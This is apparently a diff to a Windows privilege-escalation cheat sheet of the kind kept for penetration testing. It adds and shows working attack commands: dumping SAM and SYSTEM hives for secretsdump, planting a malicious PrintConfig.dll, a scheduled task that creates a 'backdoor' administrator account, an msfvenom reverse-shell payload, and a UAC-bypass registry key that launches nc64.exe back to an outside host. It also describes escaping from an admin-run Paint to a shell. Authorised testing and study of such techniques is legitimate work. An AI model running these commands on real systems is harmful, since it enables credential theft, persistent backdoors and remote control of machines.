@@ -236,6 +236,20 @@ mkdir C:\temp
 reg save hklm\sam C:\temp\sam.hive
 reg save hklm\system C:\temp\system.hive
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+# SeChangeNotifyPrivilege
+1. Run SeManageVolumeExploit.exe
+2. Create malicious "PrintConfig.dll"
+3. copy PrintConfig.dll C:\Windows\System32\spool\drivers\x64\3\
+4. Set up NC listener
+5. Execute "$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}") $object = [Activator]::CreateInstance($type)"
+
+# SeBatchLogonRight, SeCreateGlobalPrivilege
+1. Can create scheduled task?
+2. Run elevated task
+3. schtasks /create /tn "BackdoorTask" /tr "cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add" /sc once /st 00:00 
+schtasks /run /tn "BackdoorTask"
+
 ```
 
 
@@ -289,7 +303,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi 
 msiexec /quiet /qn /i sample.msi
 ```
 
-## 🔸AlwaysInstallElevated🔸
+## 🔸UAC Bypass🔸
 
 
 UAC can have different configuration levels:
@@ -331,18 +345,17 @@ Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
   | 
   | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
   `----
-
-
 ```
 
-```bash
+
+### 🔹Insecure GUI Apps🔹
+
+Note that Paint is running with admin privileges,
+In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
 
 ```
-
-###
-
-```bash
-
+C:\Users\user\Desktop>tasklist /V | findstr mspaint.exe
+mspaint.exe                   4176 RDP-Tcp#0                  2     29,108 K Unknown         WIN-QBA94KB3IOF\admin                                   0:00:00 N/A
 ```
 
 ###
